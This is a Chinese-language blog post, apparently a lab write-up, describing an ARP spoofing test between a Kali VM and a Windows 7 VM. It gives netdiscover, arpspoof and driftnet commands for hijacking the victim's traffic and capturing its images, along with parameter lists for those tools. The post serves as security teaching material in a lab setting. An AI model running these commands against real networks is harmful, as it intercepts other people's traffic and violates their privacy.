---
title: 内网渗透：记一次局域网arp劫持测试
author: Kol Huang
date: 2020-08-25 20:40:00 +0800
categories: [Blogging, kali内网渗透]
tags: [security]
comments: true
math: true
image: /HYCBlog/assets/img/security/security_cover.jpg
---



攻击前准备：

1. 一台Kali虚拟机作为attacker

2. 一台win7虚拟机作为victim

3. win7虚拟机开桥接模式，模拟以太网连接。

4. 用到的主要命令：

   ```sh
   arpspoof
   driftnet
   ```



## Step1：扫描局域网内主机

```sh
netdiscover -r 192.168.199.0/24 #扫描范围
```



![security_netdiscover](/HYCBlog/assets/img/security/security_netdiscover.png)

观察结果，推断出网关IP为`192.168.199.1`，目标主机地址为`192.168.199.169`。具体如何推断出目标主机的IP，可以从电脑型号以及当前的活跃情况推断。其实大多数attacker不会在乎自己攻击的是哪个特定主机，会在能力范围内把所有主机攻瘫。



## Step2：arp欺骗

```sh
arpspoof -i eth0 -t 192.168.199.1(网关) 192.168.199.169(目标主机)
```

在运行arpspoof之前，需要执行以下安装，否则会报`command not found`

```sh
apt-get install dsniff
```

![security_arpspoof](/HYCBlog/assets/img/security/security_arpspoof.png)

出现上述界面代表劫持成功。



## Step3：测试结果

在win7主机上通过Internet查看图片，利用driftnet工具将流经kali虚拟机的图片抓取，并显示在kali上。

```sh
driftnet -t eth0
```

![security_driftnet](/HYCBlog/assets/img/security/security_driftnet.png)

抓取成功。



至此，win7已被kali实现arp劫持。

Arpspoof是一个非常好的ARP欺骗的源代码程序。它的运行不会影响整个网络的通信，该工具通过替换传输中的数据从而达到对目标的欺骗。

```markdown
主要参数
-i，--interface要使用的网络接口，作为参数给出。 如果不使用此选项，则该接口默认为第一个正在运行的非环回接口。
-r，--repeat以参数指定的秒数为单位连续重新发送数据包。 延迟为零表示仅发送一个数据包。
-a，--attacker-ip选择另一台计算机（运行该程序的计算机除外）作为要伪装的计算机。
-g，--gateway-ip欺骗默认网关以外的IP（作为参数）。
-v，--verbose打印有关所涉及机器的额外信息。
```



Driftnet工具：Driftnet监视网络流量，抓取网络流量中的JPEG和GIF图像。这侵犯了人们的隐私，无论何时何地我们都不能这么做。除此之外，它还可以从网络中提取MPEG音频数据。

```markdown
语法： driftnet   [options]   [filter code]
主要参数：
 -b               捕获到新的图片时发出嘟嘟声
-i  interface     选择监听接口
-f  file   读取一个指定pcap数据包中的图片
-p  不让所监听的接口使用混杂模式
-a  后台模式：将捕获的图片保存到目录中（不会显示在屏幕上）
-m number 指定保存图片数的数目
-d directory  指定保存图片的路径
-x prefix  指定保存图片的前缀名
使用举例：
1.实时监听： driftnet -i wlan0
2.读取一个指定pcap数据包中的图片： driftnet -f /home/linger/backup/ap.pcapng -a -d /root/drifnet/
```



参考：

[arpspoof](https://github.com/smikims/arpspoof)

[安全工具——Driftnet与ARP中毒的结合应用](https://xz.aliyun.com/t/4001)

[图片捕获工具driftnet](https://www.cnblogs.com/lingerhk/p/4065956.html)

